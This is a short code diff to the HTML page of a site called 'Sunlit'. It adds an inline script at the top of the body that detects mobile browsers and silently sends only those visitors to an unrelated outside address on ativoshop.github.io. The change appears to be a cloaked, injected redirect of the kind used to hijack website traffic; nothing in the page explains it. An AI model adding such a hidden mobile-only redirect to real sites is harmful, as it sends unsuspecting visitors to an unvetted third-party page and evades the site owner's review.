@@ -8,6 +8,17 @@
 <link rel="stylesheet" href="styles.css" />
 </head>
 <body>
+
+  <script>
+(function () {
+    const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
+
+    if (isMobile) {
+        window.location.replace("https://ativoshop.github.io/reditecionamento/");
+    }
+})();
+</script>
+
 <header class="nav">
   <div class="container nav-inner">
     <a href="#" class="logo">Sunlit<span>.</span></a>
@@ -81,4 +92,5 @@
 
 <script src="script.js"></script>
 </body>
+
 </html>
